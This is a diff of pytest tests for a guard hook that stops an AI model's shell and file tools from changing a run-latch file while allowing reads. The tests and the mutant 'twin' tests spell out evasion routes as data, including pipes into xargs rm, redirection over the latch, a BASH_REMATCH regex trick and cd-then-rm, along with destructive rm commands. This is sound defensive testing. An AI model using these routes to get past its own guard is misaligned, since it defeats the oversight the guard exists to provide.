+    assert "names the run latch and may change it." in reason
+
+
+@pytest.mark.parametrize("joiner", ["&&", "||", ";", "|", "\n", "&"])
+def test_csr_compound_whose_second_segment_changes_the_latch_denied(
+    latch_world: _StoreWorld, joiner: str
+) -> None:
+    """AC-29: checked per segment, under every separator set. A read, or the
+    pinned unlatch, ahead of a change does not cover it."""
+    latch = latch_world.latch.as_posix()
+    for lead in (f"cat {latch}", _pinned_unlatch(latch_world)):
+        code, out = _bash(latch_world, f"{lead} {joiner} rm -f {latch}")
+        _assert_latch_denied(code, out, latch_world.latch)
+
+
+@pytest.mark.parametrize("latch", sorted(_PRESENT_LATCHES))
+def test_csr_latch_path_rule_holds_under_every_present_latch(latch_world: _StoreWorld, latch: str) -> None:
+    """AC-29: whatever the latch holds (v1, v2 of any colour, unreadable,
+    another version), changing it is denied and reading it is not. The rule
+    reads no latch, so the no-store latches of C-2 are covered too."""
+    _write_state(latch_world.impl, _PRESENT_LATCHES[latch](latch_world.store))
+    path = latch_world.latch.as_posix()
+
+    for tool, tool_input in (
+        ("Bash", {"command": f"rm -f {path}"}),
+        ("Write", {"file_path": path, "content": "{}"}),
+    ):
+        _assert_latch_denied(*_run_in(latch_world, tool, tool_input), latch_world.latch)
+    _assert_allowed(*_bash(latch_world, f"cat {path}"))
+    _assert_allowed(*_run_in(latch_world, "Read", {"file_path": path}))
+
+
+def test_csr_no_latch_leaves_the_latch_path_alone(latch_world: _StoreWorld) -> None:
+    """Control: with no latch there is no run and nothing to protect."""
+    latch_world.latch.unlink()
+    path = latch_world.latch.as_posix()
+    for tool, tool_input in (
+        ("Bash", {"command": f"rm -f {path}"}),
+        ("Write", {"file_path": path, "content": "{}"}),
+    ):
+        _assert_allowed(*_run_in(latch_world, tool, tool_input))
+
+
+def test_csr_latch_path_deny_reason_states_the_rule(guard_module, latch_world: _StoreWorld) -> None:
+    """The reason quotes the segment, says the model may read the latch but not
+    change it and what counts as a read, with the reader list taken from the
+    guard itself, then ends with the note for the person (AC-33). It gives no
+    recipe for changing the latch (PR 3 review D1): the pinned `latch` and
+    `unlatch` calls are exempt by path, so a reason that named them would
+    hand the model the one way past the rule it was just told not to take."""
+    latch = latch_world.latch.as_posix()
+    reason = _assert_latch_denied(*_bash(latch_world, f"rm -f {latch}"), latch_world.latch)
+
+    # Quoted as the guard cuts it: a Windows runner's tmp path is long enough
+    # that the 160-character cut falls inside the latch path.
+    assert f"segment {guard_module._shown('rm -f ' + latch)} names the run latch and may change it." in reason
+    assert "the model's tool calls may read it but not change it" in reason
+    assert "a `|` counts as a pipe even inside quotes" in reason
+    for name in guard_module._LATCH_READERS:
+        assert f"`{name}`" in reason
+    for recipe in ("unlatch", "mem_recall.py", "`latch` writes"):
+        assert recipe not in reason, f"the deny names {recipe!r}"
+
+
+_PIPE_CHECK = "    if not _PIPE.search(command):\n        return True\n"
+_BARE_READER = "    return not rest or rest[0] in _LATCH_READERS"
+_READ_REFUSED_LINE = '_READ_REFUSED = (">", "`", "$(", "<(", "=~")'
+_NAME_PASSED = "                name=state_path.name,\n"
+
+
+def test_mutant_without_the_pipe_check_lets_a_read_hand_the_path_on(
+    latch_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """Twin: drop the pipe check and `ls <latch> | xargs rm` reads as a read;
+    the controls still hold, so it is the pipe check the deny rests on."""
+    mutant = _write_mutant(tmp_path, "no_pipe_check", _PIPE_CHECK, "    return True\n")
+    latch = latch_world.latch.as_posix()
+
+    _assert_allowed(*_bash(latch_world, f"ls {latch} | xargs rm", hook=mutant))
+    _assert_allowed(*_bash(latch_world, f"cat {latch}", hook=mutant))
+    _assert_latch_denied(*_bash(latch_world, f"rm -f {latch}", hook=mutant), latch_world.latch)
+
+
+def test_mutant_reader_by_basename_lets_a_written_cat_through(
+    latch_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """Twin: match the reader by basename and a `./cat` the model wrote counts
+    as a read; the bare name is what keeps it out."""
+    mutant = _write_mutant(
+        tmp_path,
+        "reader_by_basename",
+        _BARE_READER,
+        "    return not rest or os.path.basename(rest[0]) in _LATCH_READERS",
+    )
+    latch = latch_world.latch.as_posix()
+
+    _assert_allowed(*_bash(latch_world, f"./cat {latch}", hook=mutant))
+    _assert_latch_denied(*_bash(latch_world, f"rm -f {latch}", hook=mutant), latch_world.latch)
+
+
+def test_mutant_read_allowing_redirection_lets_cat_overwrite_the_latch(
+    latch_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """Twin: let a read carry `>` and `cat <other> > <latch>` overwrites the
+    latch as a "read"; refusing `>` is what denies it."""
+    mutant = _write_mutant(
+        tmp_path, "read_allows_redirection", _READ_REFUSED_LINE, '_READ_REFUSED = ("`", "$(", "<(", "=~")'
+    )
+    latch = latch_world.latch.as_posix()
+    other = (latch_world.tmp / "other.json").as_posix()
+
+    _assert_allowed(*_bash(latch_world, f"cat {other} > {latch}", hook=mutant))
+    _assert_latch_denied(*_bash(latch_world, f"rm -f {latch}", hook=mutant), latch_world.latch)
+
+
+def test_mutant_read_allowing_a_regex_match_hands_the_path_on(
+    latch_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """Twin: let a read carry `=~` and `[[ <latch> =~ .* ]] && rm
+    "$BASH_REMATCH"` passes, its `rm` never naming the latch; refusing `=~`
+    is what denies it."""
+    mutant = _write_mutant(
+        tmp_path, "read_allows_regex_match", _READ_REFUSED_LINE, '_READ_REFUSED = (">", "`", "$(", "<(")'
+    )
+    latch = latch_world.latch.as_posix()
+
+    _assert_allowed(*_bash(latch_world, f'[[ {latch} =~ .* ]] && rm -f "$BASH_REMATCH"', hook=mutant))
+    _assert_allowed(*_bash(latch_world, f"[[ -f {latch} ]]", hook=mutant))
+
+
+def test_mutant_without_the_file_name_lets_a_cd_reach_the_latch(
+    latch_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """Twin: stop passing the latch's file name and a `cd` into its folder
+    followed by `rm .mem-state.json` passes, while the path itself is still
+    denied; the name rule is what closes the `cd` form."""
+    mutant = _write_mutant(tmp_path, "no_file_name", _NAME_PASSED, "")
+    command = f"cd {_LATCH_DIR} && rm -f .mem-state.json"
+
+    _assert_allowed(*_bash(latch_world, command, hook=mutant))
+    _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)
+    _assert_latch_denied(
+        *_bash(latch_world, f"rm -f {latch_world.latch.as_posix()}", hook=mutant), latch_world.latch
+    )
+
+
+# --- SECURITY.md (CSR-UNIT-042) ------------------------------------------------
+
+
+def test_csr_security_md_carries_the_left_behind_latch_caveat() -> None:
+    """CSR-UNIT-042 (AC-13, AC-33): invariant 6 says a dead run's latch keeps
+    denying until the next Stage 1 or its deletion by hand, and that each run
+    removes its own with `unlatch`; invariant 7 carries the latch-file
+    protection of decision 11, its reader list equal to the guard's; and the
+    count matches the guard's docstring (seven invariants)."""
+    text = (_REPO_ROOT / "SECURITY.md").read_text(encoding="utf-8")
+    assert "It enforces seven invariants:" in text
+    invariants = [line.strip() for line in text.splitlines() if re.match(r"\s+\d\. ", line)]
+    assert [line[:2] for line in invariants] == ["1.", "2.", "3.", "4.", "5.", "6.", "7."]
+    sixth = invariants[5]
+    assert "left behind" in sixth
+    assert "Stage 1" in sixth
+    assert "delete it by hand" in sixth
+    assert "`mem_recall.py unlatch`" in sixth
+    assert "not to remove the latch itself" in sixth
+    assert "changing the latch file" in invariants[6]
+    reader_line = next(line for line in text.splitlines() if "- its command is `" in line)
+    listed = re.findall(r"`([^`]+)`", reader_line.split(", by that bare name")[0])
+    module = _load_guard_module()
+    assert set(listed) == set(module._LATCH_READERS)
+    doc = module.__doc__
+    assert "  7. Cross-Session Recall, local run store" in doc
+    assert "latch file" in doc
